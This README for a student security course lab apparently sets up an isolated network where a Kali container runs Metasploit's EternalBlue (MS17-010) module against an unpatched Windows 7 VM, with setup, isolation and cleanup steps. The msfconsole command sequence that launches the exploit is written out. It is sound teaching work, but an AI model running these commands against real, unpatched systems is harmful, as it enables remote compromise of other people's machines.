# cdci-team10_wannacry

Team 10's CDCI assignment 1 demo. Attacker (Kali + Metasploit) runs as a
Docker container managed by Containernet. Victim (Windows 7 SP1, unpatched)
runs under QEMU. Both attach to the same emulated OVS switch with no uplink.

## Topology

    mn.attacker (Docker, Kali + MSF)      Windows 7 VM (QEMU)
    10.0.0.2/24                           10.0.0.3/24
          |                                     |
     attacker-eth0                        tap-win7
          |                                     |
          +----------- s1 (OVS) ---------------+
                       (standalone, no uplink)

## Prerequisites

- Ubuntu 24.04, sudo access. Local VM or cloud VM — either works.
- ~10 GB free disk for the Windows 7 image.
- QEMU/KVM. Pure emulation works, just slower to boot Windows.

## 1. Online stage (run once)

    sudo bash infrastructure/install.sh

Installs system packages, creates `/opt/cdci-wannacry/venv`, installs
`requirements.txt`, compiles `mnexec`, builds the attacker image from
`infrastructure/Dockerfile`, downloads and converts the Windows 7 OVA to
`/opt/cdci-wannacry/win7.qcow2`, and writes `versions.txt`.

Rerunning is safe: it reuses the venv, image, and qcow2 if present.

## 2. One-time Windows IP check

The OVA's default network config is unknown until you boot it once. Confirm
the VM comes up as `10.0.0.3/24`:

    sudo qemu-system-x86_64 -m 2048 -drive \
        file=/opt/cdci-wannacry/win7.qcow2,format=qcow2,if=ide \
        -netdev user,id=n0 -device e1000,netdev=n0 -nographic

Inside Windows run `ipconfig`. If the address is not `10.0.0.3/24`, set it
statically (`10.0.0.3`, mask `255.255.255.0`, no gateway). Shut down. This is
the only manual step and only happens once.

## 3. Demo stage (every run)

    sudo bash infrastructure/run.sh

Brings up Containernet with the attacker container, attaches the tap, boots
the Windows VM, and waits for port 445. It prints:

    Attacker: 10.0.0.2/24  (container mn.attacker)
    Victim:   10.0.0.3/24  (Windows 7 under QEMU)
    Waiting for port 445 on victim...
    Demo ready.

From another terminal on the same VM:

    sudo docker exec -it mn.attacker msfconsole
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    msf6 > set RHOSTS 10.0.0.3
    msf6 > run

To leave the lab up for inspection instead of tearing it down on Ctrl-C, run
`sudo bash infrastructure/run.sh --hold`, then press Enter to stop.

## Isolation model

The cloud VM's network adapter stays up. That is required for SSH and is not
a risk. Lab isolation comes from three things:

- `s1` is an OVS switch with `failMode="standalone"` and no controller.
- `s1` has exactly two ports: the attacker veth and the Windows tap.
- The attacker container runs with `network_mode="none"`, so Docker does not
  attach it to any default bridge. The only interface is the lab link.

Nothing in the lab has a route to the host's default route.

## If a run is interrupted

`run.sh` refuses to start if stale lab objects exist. Clean them:

    sudo docker rm -f mn.attacker 2>/dev/null || true
    sudo ovs-vsctl --if-exists del-br s1
    sudo ip link del tap-win7 2>/dev/null || true
    sudo rm -f /run/cdci-wannacry-qemu.pid

Retry `run.sh` afterwards.

## Optional packet evidence

With the lab running via `--hold`, capture SMB traffic on the host side of
the lab link:

    sudo timeout 15s tcpdump -ni s1-attacker -c 20 -w "$HOME/smb.pcap" 'tcp port 445'

The file contains only lab traffic. Keep it with the demo records.

## Developer checks

`infrastructure/test.sh` still contains checks written for the previous
fixture (HTTP health endpoint). Those no longer apply and will be replaced
by checks for the attacker-to-victim 445 path. Until they are rewritten,
the rehearsal is `run.sh` against the real topology.